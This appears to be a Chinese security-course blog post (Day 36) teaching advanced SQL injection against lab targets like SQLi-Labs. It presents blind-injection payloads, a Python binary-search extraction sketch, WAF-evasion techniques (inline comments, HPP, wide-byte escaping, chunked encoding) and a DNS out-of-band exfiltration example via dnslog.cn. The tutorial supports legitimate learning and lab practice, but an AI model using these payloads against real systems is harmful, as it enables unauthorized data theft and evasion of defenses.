---
title: Day036：SQL 注入进阶 - 盲注优化与 WAF 绕过实战
tags:
  - 网络
  - 安全
  - 学习计划
categories:
  - 网络安全
abbrlink: 0e7a2
date: 2026-02-27
updated: 2026-02-27
---

# Day036：SQL 注入进阶 - 盲注优化与 WAF 绕过实战

- **日期**：2026-02-27
- **周次**：第 6 周
- **模块**：Web 漏洞进阶
- **主题**：SQL 注入进阶（盲注与 WAF 对抗）
- **预计学习时间**：3.5 小时

---

## 🎯 学习目标

学完今天你应该能做到：

- **极限盲注**：掌握时间盲注、布尔盲注的脚本自动化编写，并学习二分法、位运算等加速手段。
- **WAF 绕过**：掌握字符编码、大小写变换、内联注释、特殊符号、参数污染等 10+ 种绕过防火墙的思维。
- **实战对抗**：在有安全过滤的靶场环境中，通过逻辑组合成功提取数据。

<!--more-->

---

## 📚 完整学习内容（必读）

### 一、盲注的“极限加速”技巧

当页面没有回显（Union 注入失效）且报错被屏蔽时，盲注是你最后的武器。但常规盲注太慢，容易触发封禁。

#### 1.1 逻辑优化
- **二分法 (Binary Search)**：不要从 'a' 猜到 'z'，而是用 ASCII 码。
  - `ascii(substr(database(),1,1)) > 100` -> `True` -> 猜 100-127 之间。
  - 效率提升：原本 26 次请求缩短为 7 次请求。
- **位运算 (Bitwise)**：通过判断二进制位的值来确定字符。
  - `ascii(substr(database(),1,1)) & 1` -> 判断最低位。

#### 1.2 时间盲注的“降噪”处理
时间盲注极易受到网络波动影响。
- **技巧**：使用 `benchmark()` 或 `sleep()` 时，先发送一个基准包计算延迟，再发送 Payload。
- **Payload 示例**：`if(ascii(substr(database(),1,1))>100,sleep(3),0)`。

---

### 二、WAF (Web 应用防火墙) 绕过思维

WAF 是通过规则匹配（正则）或机器学习来识别攻击的。我们的目标是：**“让 WAF 看不懂，但让数据库能执行”**。

#### 2.1 基础绕过技巧
1.  **大小写/双写变换**：`sElEcT`, `uniunionon` (针对简单的替换过滤)。
2.  **编码绕过**：
    -   URL 全编码/二次编码。
    -   十六进制编码：`0x61646d696e` (admin)。
3.  **内联注释 (MySQL 特色)**：`/*!50001 SELECT*/`。WAF 以为是注释，数据库以为是执行指令。
4.  **特殊符号替换**：
    -   空格用 `/**/`, `%0a`, `%09`, `+` 替换。
    -   等号 `=` 用 `LIKE`, `IN`, `REGEXP` 替换。

#### 2.2 高级对抗思维
1.  **HPP (HTTP 参数污染)**：
    -   `?id=1&id=1' AND 1=1 --+`
    -   某些 WAF 只检查第一个 `id`，而某些后端（如 ASP.NET）会解析最后一个 `id`。
2.  **空白符填充**：在 `SELECT` 和 `FROM` 之间填充大量无用注释或空白符，撑爆 WAF 的扫描缓冲区。
3.  **宽字节注入 (GBK 专场)**：
    -   针对转义符 `\` (%5c)。
    -   输入 `%df'` -> 后端转义为 `%df%5c%27` -> GBK 认为 `%df%5c` 是一个汉字“運” -> 成功逃逸单引号。

---

### 三、实战细节：自动化脚本编写

不要只依赖 SQLmap。在有高难度 WAF 的情况下，SQLmap 往往会失效，你需要编写定制化的 Python 脚本。

```python
# 伪代码：二分法盲注核心逻辑
def binary_search(pos, low, high):
    while low <= high:
        mid = (low + high) // 2
        payload = f"1' AND ascii(substr(database(),{pos},1)) > {mid} -- "
        if request(payload):  # 页面返回 True
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

---

## 🗺️ 知识图谱

```
SQL 注入进阶
├── 注入技巧深度
│   ├── 二分法/位运算 (加速)
│   ├── OOB (带外通道注入) ── dnslog.cn
│   └── 堆叠注入 (Stacked Queries)
└── WAF 对抗矩阵
    ├── 协议层 (分块传输、HPP)
    ├── 语法层 (内联注释、特殊运算符)
    └── 逻辑层 (白名单 Bypass、认证绕过)
```

---

## 🔧 实践任务

### 任务 1：手动编写“二分法”盲注脚本 (60 分钟)
**环境**：本地搭建 SQLi-Labs Less-8 (布尔盲注)。
**要求**：
1. 编写 Python 脚本，利用二分法爆破出当前数据库名。
2. 记录请求次数，并与逐个匹配（a-z）的请求次数进行对比。

### 任务 2：WAF 绕过挑战 (40 分钟)
**情景**：目标后端代码如下：
`$id = str_replace(['select', 'union', 'sleep', ' '], '', $_GET['id']);`
**要求**：
1. 分析该过滤器的漏洞点（大小写未过滤、只过滤了一次空格）。
2. 写出至少 3 种能执行 `UNION SELECT` 的绕过 Payload。

---

## 📝 巩固练习

### 练习 1：概念分析
**题目**：为什么“分块传输 (Chunked Encoding)”可以绕过某些过时的 WAF？
**参考答案**：因为分块传输将数据包切碎发送。如果 WAF 不支持协议重组，它只能看到每一个碎片的“片段”，无法拼凑出完整的攻击 Payload（如 `SE` + `LE` + `CT`），从而漏报。

### 练习 2：简答题
**题目**：在使用 `dnslog.cn` 进行带外注入（OOB）时，其基本原理是什么？
**参考答案**：利用数据库内置的函数（如 MySQL 的 `load_file()`）发起网络请求。将查询结果拼接在子域名中（如 `select user().xxxx.dnslog.cn`）。通过查看 dnslog 服务器的访问记录，直接获取数据，无需通过页面回显。

---

## ✅ 评估标准

- [ ] 我能独立编写高效的二分法盲注 Python 脚本。
- [ ] 我能熟练使用 `/*! */`、`%df`、`HPP` 等 5 种以上的绕过手段。
- [ ] 我理解带外注入（OOB）的适用场景及原理。

---

## 💡 知识卡片速查

### 绕过万能公式
1. **换汤 (编码)**：Base64, Hex, Unicode。
2. **换药 (函数)**：`substr()` 换 `mid()`，`=` 换 `like`。
3. **加佐料 (注释/干扰)**：`/*!50000select*/`, `/**/`。
4. **钻空子 (逻辑)**：利用 WAF 和后端服务器对参数解析的差异（HPP）。

---

> 💬 **老师寄语**：
> 渗透是一场猫鼠游戏。WAF 的开发者在研究黑客，而顶尖黑客在研究“WAF 是如何研究黑客的”。

```bash
git add daily/Day036.md
git commit -m "Day036: 完成 SQL 注入进阶与 WAF 绕过"
```
